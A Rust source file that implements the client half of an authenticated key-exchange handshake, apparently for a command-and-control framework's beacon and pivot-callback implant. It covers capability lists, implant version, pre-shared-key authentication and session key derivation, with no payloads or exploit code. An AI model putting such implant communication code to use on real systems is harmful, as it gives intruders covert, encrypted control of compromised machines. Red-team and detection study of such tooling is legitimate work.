//! The client half of the umbra/v1 handshake.
//!
//! The beacon and the pivot callback client both need it and both must
//! produce byte-identical transcripts, so it lives in one place: a divergence
//! here would show up as "the server accepts the beacon but not the tunnel".

use crate::crypto;
use crate::session::Session;
use crate::transport::Channel;
use crate::upk::{self, Value};
use crate::wire;

/// The result of a successful handshake.
pub struct Handshake {
    /// The session keys, ready for use.
    pub session: Session,
    /// The 128-bit session id the server handed out.
    pub session_id: Vec<u8>,
    /// The decoded HELLO_ACK body (policy, server metadata).
    pub ack: Value,
    /// The socket the handshake ran on, when the caller passed one in. The
    /// pivot callback takes it over so the session keeps running.
    pub stream: Option<crate::transport::TcpStream>,
}

/// The fields of the newer handshake.
///
/// The version 1 handshake had nothing but the metadata.  Version 2 moves
/// the capability list out of the metadata and into a field of its own,
/// and adds the version of the implant, the module ABI version it speaks
/// and the platform details.  A server that only knows version 1 still
/// works: the handshake falls back to the old shape.
#[derive(Clone, Debug)]
pub struct Hello {
    /// The handshake version to speak.
    pub version: u8,
    /// The capability list: the task kinds this implant can run.
    pub caps: Vec<Value>,
    /// The version of the implant.
    pub implant_version: String,
    /// The module ABI version the implant speaks.
    pub abi: u8,
    /// The platform details: the os, the architecture and the family.
    pub platform: Value,
}

impl Default for Hello {
    fn default() -> Self {
        Hello {
            version: 1,
            caps: Vec::new(),
            implant_version: String::new(),
            abi: 0,
            platform: Value::Map(std::collections::BTreeMap::new()),
        }
    }
}

/// Perform the client side of the handshake.
///
/// `meta` is the HELLO metadata map: the agent metadata for a beacon, and
/// the agent metadata plus `tunnel` for a pivot callback.
pub fn client_handshake(
    channel: &mut dyn Channel,
    psk: &[u8],
    role: u8,
    ident: &str,
    suite: u8,
    meta: Value,
    hello: &Hello,
) -> Result<Handshake, String> {
    let (secret, pubkey) = crypto::x25519_keypair();
    let cn = crypto::random_bytes(16);
    let ts = now_secs();

    let auth = crypto::hello_auth(psk, role, ident.as_bytes(), &pubkey, &cn, ts, suite)
        .map_err(|e| format!("hello auth: {e}"))?;

    let mut fields = vec![
        ("v", upk::u(hello.version as u64)),
        ("role", upk::u(role as u64)),
        ("id", upk::s(ident)),
        ("pub", upk::bin(&pubkey)),
        ("cn", upk::bin(&cn)),
        ("ts", upk::u(ts)),
        ("suite", upk::u(suite as u64)),
        ("auth", upk::bin(&auth)),
        ("meta", meta),
    ];
    if hello.version >= 2 {
        // The capability list is a field of its own now: the server reads
        // it before it looks at the metadata, and it refuses work the
        // beacon cannot do.
        fields.push(("caps", upk::arr(hello.caps.clone())));
        fields.push(("iver", upk::s(&hello.implant_version)));
        fields.push(("abi", upk::u(hello.abi as u64)));
        fields.push(("plat", hello.platform.clone()));
    }
    let hello_body = upk::map(fields);
    let encoded = upk::encode(&hello_body).map_err(|e| format!("encode hello: {e}"))?;
    let mut body = Vec::with_capacity(encoded.len() + 1);
    body.push(wire::MARKER_HELLO);
    body.extend_from_slice(&encoded);

    let mut boot = Session::from_bootstrap(psk, suite, false)
        .map_err(|e| format!("bootstrap session: {e}"))?;
    let frame = boot
        .seal(wire::MSG_HELLO, &body)
        .map_err(|e| format!("seal hello: {e}"))?;
    channel
        .write_frame(&frame)
        .map_err(|e| format!("write hello: {e}"))?;

    let resp = channel
        .read_frame()
        .map_err(|e| format!("read hello_ack: {e}"))?;
    let (msg_type, plain) = boot
        .open(&resp)
        .map_err(|e| format!("open hello_ack: {e}"))?;
    if msg_type != wire::MSG_HELLO_ACK {
        return Err(format!(
            "expected HELLO_ACK, got {}",
            wire::type_name(msg_type)
        ));
    }
    if plain.first() != Some(&wire::MARKER_HELLO_ACK) {
        return Err("bad HELLO_ACK marker".to_string());
    }
    let ack = upk::decode_exact(&plain[1..]).map_err(|e| format!("decode hello_ack: {e}"))?;

    let server_pub = ack.bin_or("pub", &[]);
    let sn = ack.bin_or("sn", &[]);
    let sid = ack.bin_or("sid", &[]);
    let neg_suite = ack.u64_or("suite", 0) as u8;
    if server_pub.len() != 32 || sn.len() != 16 || sid.len() != 16 {
        return Err("malformed HELLO_ACK fields".to_string());
    }
    if neg_suite != suite {
        return Err("server changed the AEAD suite without negotiation".to_string());
    }

    let want = crypto::ack_auth(
        psk,
        ident.as_bytes(),
        &pubkey,
        &server_pub,
        &cn,
        &sn,
        &sid,
        neg_suite,
    )
    .map_err(|e| format!("ack auth: {e}"))?;
    let got = ack.bin_or("auth", &[]);
    if !ct_eq(&want, &got) {
        return Err("server authentication failed (wrong PSK?)".to_string());
    }

    let shared = crypto::x25519_shared(secret, &server_pub)
        .map_err(|e| format!("x25519: {e}"))?;
    let (prk, km) = crypto::derive_session(&shared, &cn, &sn)
        .map_err(|e| format!("derive session: {e}"))?;
    let session = Session::new(neg_suite, km, false, false, Some(prk))
        .map_err(|e| format!("session: {e}"))?;

    Ok(Handshake {
        session,
        session_id: sid,
        ack,
        stream: channel.take_stream(),
    })
}

/// Constant-time comparison for authentication tags.
pub fn ct_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

/// The current unix time in seconds.
pub fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}
